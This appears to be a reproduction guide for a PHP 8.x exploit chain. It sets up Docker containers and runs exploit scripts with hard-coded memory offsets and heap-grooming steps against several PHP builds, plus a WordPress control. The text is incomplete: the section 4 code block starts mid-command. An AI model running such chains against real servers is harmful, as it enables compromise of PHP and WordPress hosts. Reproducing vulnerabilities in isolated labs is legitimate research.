## 0. Quick start (one build)

```bash
mkdir -p <RUNDIR>/bodies
xz -dc bodies/a1_early.bin.xz > <RUNDIR>/bodies/a1_early.bin
xz -dc bodies/b1_early.bin.xz > <RUNDIR>/bodies/b1_early.bin
mkdir -p <RUNDIR>/run/841/{conf,www,logs,out}
cp php-8.4.1/evidence/config/php.ini            <RUNDIR>/run/841/conf/
cp php-8.4.1/evidence/docroot/index.php         <RUNDIR>/run/841/www/
bash tools/setup_build.sh 8.4.1 <PORT> <container> <RUNDIR>/run/841
python3 tools/chain_early.py --container <container> --port <PORT> \
  --tag PR841B --build 8.4.1 --zdtor 0x628c40 --zif 0x4397c0 --soff 0xED398 \
  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
  --outdir <RUNDIR>/run/841/out --logdir <RUNDIR>/run/841/logs --restart
```

`--restart` restarts the container before the run (fresh ASLR); omit it for the first run.

## 3. WordPress endpoint control (8.4.1 only)

```bash
mkdir -p <RUNDIR>/run/841wp/{conf,logs,out}
cp php-8.4.1/evidence/config/*.conf <RUNDIR>/run/841wp/conf/
cp php-8.4.1/evidence/config/php.ini <RUNDIR>/run/841wp/conf/
chmod 777 <RUNDIR>/run/841wp/logs
docker run -d --name <container> -p 127.0.0.1:<PORT>:80 \
  -v <RUNDIR>/run/841wp/conf/php.ini:/usr/local/etc/php/php.ini:ro \
  -v <RUNDIR>/run/841wp/conf/000-default-p2s.conf:/etc/apache2/sites-enabled/000-default.conf:ro \
  -v <RUNDIR>/run/841wp/conf/zz-p2s.conf:/etc/apache2/conf-enabled/zz-p2s.conf:ro \
  -v <WP_TREE>:/var/www/html:ro \
  -v <RUNDIR>/run/841wp/logs:/var/log/apache2 php:8.4.1-apache
python3 tools/chain_early.py --container <container> --port <PORT> \
  --tag PR841WP --build 8.4.1 --zdtor 0x628c40 --zif 0x4397c0 --soff 0xED398 \
  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
  --outdir <RUNDIR>/run/841wp/out --logdir <RUNDIR>/run/841wp/logs \
  --path /wp-content/index.php
```

The control tree was WordPress `7.2-beta1-64694`; `/wp-content/index.php` is the 28-byte core silence file (md5 `67442c5615eba73d105c0715c6620850`).

## 4. 8.2.34 / 8.3.35 recovered-body rerun (target-written)

The 2026-10-26 rerun used the recovered Oct-24 bodies and `cold_chain.py` (R1
pool pinning), not the earlier `a1_early.bin`/`b1_early.bin` pair. Exact
per-build commands, including body regeneration, are in
`php-8.2.34/commands.txt` and `php-8.3.35/commands.txt`.

```bash

  -v <RUNDIR>/www:/var/www/html \
  -v <RUNDIR>/logs:/var/log/apache2 \
  -v <RUNDIR>/conf/php.ini:/usr/local/etc/php/php.ini \
  php:8.2.34-apache
python3 <RUNDIR>/scripts/cold_chain.py --container <container> --port <PORT> \
  --tag 8234b_r1 --zd-off 0x487650 --zif-off 0x39b8a0 --s-off 0xF9398 \
  --steps "warmup:20,holders:149:640,ramp:15,a1,b1,a2,b2,marker" \
  --logfile <RUNDIR>/out/run_8234b_r1.log

docker run -d --name <container> -p 127.0.0.1:<PORT>:80 \
  -v <RUNDIR>/www:/var/www/html \
```
